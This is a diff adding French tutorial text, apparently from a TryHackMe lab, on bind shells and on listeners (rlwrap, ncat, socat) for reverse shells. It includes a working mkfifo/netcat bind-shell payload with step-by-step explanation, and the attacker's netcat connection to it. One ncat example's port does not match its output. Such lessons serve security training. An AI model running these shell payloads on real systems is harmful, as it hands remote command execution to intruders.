@@ -82,3 +82,129 @@ See "man sudo_root" for details.
 
 target@tryhackme:~$
 ```
+
+## Bind Shell
+
+Comme son nom l'indique, un bind shell va lier un port sur le système compromis et écouter une connexion ; lorsque cette connexion se produit, il expose la session shell afin que l'attaquant puisse exécuter des commandes à distance.
+
+Cette méthode peut être utilisée lorsque la cible compromise n'autorise pas les connexions sortantes, mais elle tend à être moins populaire car elle doit rester active et écouter les connexions, ce qui peut conduire à la détection.
+
+### Comment fonctionnent les Bind Shells
+
+#### Configuration du Bind Shell sur la Cible
+
+Créons un bind shell. Dans ce cas, l'attaquant peut utiliser une commande comme celle ci-dessous sur la machine cible.
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+**Explication du Payload :**
+
+- `rm -f /tmp/f` - Cette commande supprime tout fichier de pipe nommé existant situé à `/tmp/f/`. Cela garantit que le script peut créer un nouveau pipe nommé sans conflits.
+
+- `mkfifo /tmp/f` - Cette commande crée un pipe nommé, ou FIFO, à `/tmp/f`. Les pipes nommés permettent une communication bidirectionnelle entre les processus. Dans ce contexte, il agit comme un conduit pour l'entrée et la sortie.
+
+- `cat /tmp/f` - Cette commande lit les données du pipe nommé. Elle attend une entrée qui peut être envoyée via le pipe.
+
+- `| bash -i 2>&1` - La sortie de cat est redirigée vers une instance de shell (bash -i), ce qui permet à l'attaquant d'exécuter des commandes de manière interactive. Le `2>&1` redirige l'erreur standard vers la sortie standard, garantissant que les messages d'erreur sont renvoyés à l'attaquant.
+
+- `| nc -l 0.0.0.0 8080` - Démarre Netcat en mode écoute (-l) sur toutes les interfaces (0.0.0.0) et le port 8080. Le shell sera exposé à l'attaquant une fois qu'il se connectera à ce port.
+
+- `>/tmp/f` - Cette dernière partie renvoie la sortie des commandes dans le pipe nommé, permettant une communication bidirectionnelle.
+
+La commande ci-dessus écoutera les connexions entrantes et exposera un shell bash. Il faut noter que les ports inférieurs à 1024 nécessiteront que Netcat soit exécuté avec des privilèges élevés. Dans ce cas, l'utilisation du port 8080 évitera cela.
+
+**Terminal sur la Machine Cible (Configuration du Bind Shell) :**
+
+```bash
+target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+Une fois la commande exécutée, elle attendra une connexion entrante, comme indiqué ci-dessus.
+
+#### L'attaquant se connecte au Bind Shell
+
+Maintenant que la machine cible attend des connexions entrantes, nous pouvons utiliser Netcat à nouveau avec la commande suivante pour nous connecter.
+
+```bash
+nc -nv TARGET_IP 8080
+```
+
+**Explication de la commande :**
+
+- `nc` - Cela invoque Netcat, qui établit la connexion à la cible.
+- `-n` - Désactive la résolution DNS, permettant à Netcat de fonctionner plus rapidement et d'éviter les recherches inutiles.
+- `-v` - Le mode verbeux fournit une sortie détaillée du processus de connexion, par exemple lorsque la connexion est établie.
+- `TARGET_IP` - L'adresse IP de la machine cible où le bind shell est en cours d'exécution.
+- `8080` - Le numéro de port sur lequel le bind shell écoute.
+
+**Terminal de l'attaquant (Après connexion) :**
+
+```bash
+attacker@kali:~$ nc -nv 10.10.13.37 8080 
+(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
+target@tryhackme:~$
+```
+
+Après la connexion, nous pouvons obtenir un shell, comme indiqué ci-dessus, et exécuter des commandes.
+
+---
+
+## Outils d'Écoute pour Shells
+
+Comme nous l'avons appris dans les tâches précédentes, un reverse shell se connectera depuis la cible compromise vers la machine de l'attaquant. Un utilitaire comme Netcat gérera la connexion et permettra à l'attaquant d'interagir avec le shell exposé, mais Netcat n'est pas le seul utilitaire qui nous permettra de le faire.
+
+Explorons quelques outils qui peuvent être utilisés comme écouteurs pour interagir avec un shell entrant.
+
+### Rlwrap
+
+C'est un petit utilitaire qui utilise la bibliothèque GNU readline pour fournir l'édition au clavier et l'historique.
+
+**Exemple d'utilisation (Amélioration d'un Shell Netcat avec Rlwrap) :**
+
+```bash
+attacker@kali:~$ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+```
+
+Cela enveloppe nc avec rlwrap, permettant l'utilisation de fonctionnalités comme les touches fléchées et l'historique pour une meilleure interaction.
+
+### Ncat
+
+Ncat est une version améliorée de Netcat distribuée par le projet NMAP. Il fournit des fonctionnalités supplémentaires, comme le chiffrement (SSL).
+
+**Exemple d'utilisation (Écoute de Reverse Shells) :**
+
+```bash
+attacker@kali:~$ ncat -lvnp 4444
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+```
+
+**Exemple d'utilisation (Écoute de Reverse Shells avec SSL) :**
+
+```bash
+attacker@kali:~$ ncat --ssl -lvnp 4444
+Ncat: Version 7.94SVN ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+```
+
+L'option `--ssl` active le chiffrement SSL pour l'écouteur.
+
+### Socat
+
+C'est un utilitaire qui vous permet de créer une connexion socket entre deux sources de données, dans ce cas, deux hôtes différents.
+
+**Exemple d'utilisation par défaut (Écoute de Reverse Shell) :**
+
+```bash
+attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
+2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
+```
+
+La commande ci-dessus utilise l'option `-d` pour activer la sortie verbeuse ; l'utiliser à nouveau (`-d -d`) augmentera la verbosité des commandes. L'option `TCP-LISTEN:443` crée un écouteur TCP sur le port 443, établissant un socket serveur pour les connexions entrantes. Enfin, l'option `STDOUT` dirige toutes les données entrantes vers le terminal.
